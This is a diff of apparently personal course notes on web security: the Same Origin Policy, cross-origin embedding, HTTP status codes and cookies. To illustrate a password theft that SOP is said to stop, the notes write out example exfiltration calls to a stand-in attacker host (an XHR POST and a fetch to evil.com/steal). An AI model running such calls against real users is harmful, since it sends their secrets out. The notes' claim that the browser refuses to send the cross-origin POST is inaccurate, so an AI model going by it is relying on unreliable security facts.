@@ -22,7 +22,6 @@ We will focus on application, presentation and session part of OSI model.
 Application (Layer 7) eg. amazon.com 
 
 ### Assumptions
-
 Site is trustworthy 
 Third-party sites are trustworthy. 
 DNS is trustworthy.
@@ -30,22 +29,46 @@ TLS and CAs are trustworthy.  It is possible TLS is broken but rare thing to see
 Lower layers of the stack are trustworthy. 
 Attackers cannot intercept traffic - TLS partially solves this. 
 But there are a lot of technology like proxy end the TLS. so if proxy gets compromised it is a problem. 
-Sites cannot escape the browser sandbox. 
+**Sites cannot escape the browser sandbox.** 
 #### Important 
-Different origins are isolated. -> origin = <scheme, host, port> 
+Different origins are isolated. -> origin = **<scheme, host, port>** 
 Every web object is associated with an origin. 
-- HTML, CSS, scripts, images, fonts... 
+- **HTML, CSS, scripts, images, fonts...** 
 eg. the jpeg file that you fetch. 
 
 ####  Same Origin Policy: 
 **Scripts** from one origin cannot access data from another origin. 
-Majorly it is Javascript, javascript running your browser cannot access other javascripts. 
-Browser is enforcing this policy. If the browser has a bug it has lost the game. 
+Majorly it is **Javascript, javascript running your browser cannot access other javascripts.** 
+Browser is enforcing this policy. **If the browser has a bug it has lost the game.** 
 
+![[Pasted image 20260530134009.png]]
 
-As long as it is the html tag it is blocked. 
-<script src - "> </script> - a third party code sourcing is allowed though it can be leverage malicious. This is a gap we will be addressing in two weeks. 
+A script running on `bank.com` is trying to secretly send your password to `evil.com`:
+
+1. Creates an HTTP request (`XMLHttpRequest`)
+2. Packages up your password into form data
+3. POSTs it to `evil.com`
+
+**Why SOP blocks it:**
+
+The **Same-Origin Policy** says: a script can only send/read data to/from the **same origin** it came from. Origin = **protocol + domain + port.**
+
+The script is from `bank.com` but is trying to talk to `evil.com` — that's a **different origin**, so the browser just refuses to send it.
+![[Pasted image 20260530134026.png]]
+
+Is allowed because you're just **_embedding_ a resource**, not _reading data back from it_. SOP only kicks in when a script tries to **read or send sensitive data** across origins.
+
+As long as it is the html tag it is allowed. 
+< img src="https://evil.com/pic.png">       ✅
+< script src="https://evil.com/code.js">    ✅
+< link href="https://evil.com/style.css">   ✅
+
+**<script src - "> </script> - a third party code sourcing is allowed though it can be leverage malicious. This is a gap we will be addressing in two weeks.** 
 If you apply CSP you do it better - two weeks. 
+
+Blocked (JavaScript trying to read/send data):
+xhr.open("POST", "https://evil.com", true)  ❌
+fetch("https://evil.com/steal")             ❌
 
 eg. if you are accessing Bank of America you cant access Minecraft javascript. 
 - Basics of classic web security
@@ -54,30 +77,38 @@ Adjustments possible , login to github using your google account.
 
 #### Hypertext transfer Protocol (HTTP)
 
-HTTP 1.1 is text based. 
+![[Pasted image 20260530135042.png]]
+
+**Stateless** means each HTTP request is completely independent — the server has no memory of previous requests. Every request starts fresh.
 HTTP H2,H3 are binary and compressed in multiple ways which dont make any sense. 
-
-**HTTP Request**
-
-Key-value pairs. 
 Body does not have structures. 
 
 Status code 
-200 family is success 
-300 is redirection 
-400 is client error. 
-500 is not you and me the server. 
-
+**200 family is success** 
+**300 is redirection** 
+**400 is client error.** 
+**500 is not you it is  the server.** 
 400 and 500 is useful for class
 
 HTTP is transactional you send one request and send response, batching does not work. 
 
 HTTP is not  stateful like  TCP, but application is stateful like when you login amazon.com 
 State is not http job but the backend's job. 
-Cookies is the only state the cookie has. Cookie is one key value pair. 
 
-If you set httponly = true that means cookie cannot be sent through document.cookie() or javascript 
-some times javascript might need the cookie. 
+How HTTP "fakes" state:
+- **Cookies** — server sends a cookie, browser sends it back on every request. Cookie is one key value pair. 
+- **Sessions** — server stores session data, gives you a session ID (usually via a cookie)
+- **URL parameters** — state passed in the URL like `?user=tan`
+- **LocalStorage/SessionStorage** — browser-side storage JS can read
+
+#### HTTP Request 
+![[Pasted image 20260530135819.png]]
+
+#### HTTP Methods 
+
+
+If you set **httponly = true that means cookie cannot be sent through document.cookie() or javascript** 
+**some times javascript might need the cookie.** 
 but if not do set this value. 
 
 You login to amazon.com it returns back success page. 
